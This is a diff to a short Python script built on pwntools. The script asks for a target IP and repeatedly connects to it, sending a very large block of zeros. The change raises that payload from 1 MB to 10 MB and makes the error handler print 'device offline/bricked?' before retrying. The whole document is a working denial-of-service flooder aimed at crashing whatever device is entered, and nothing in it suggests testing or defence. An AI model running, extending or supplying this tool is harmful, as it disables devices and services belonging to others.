@@ -1,7 +1,7 @@
 print("importing and prepping")
 from pwn import *
 from time import sleep
-verylargestring = bytes("0" * 1000000, "utf-16")
+verylargestring = bytes("0" * 10000000, "utf-8")
 print("done")
 ip = input("ip:")
 print("sending packets")
@@ -12,4 +12,6 @@ while True:
         p.send(verylargestring)
         p.close()
     except:
-        sleep(1)
+        print('device offline/bricked?')
+        p.close()
+        sleep(5)
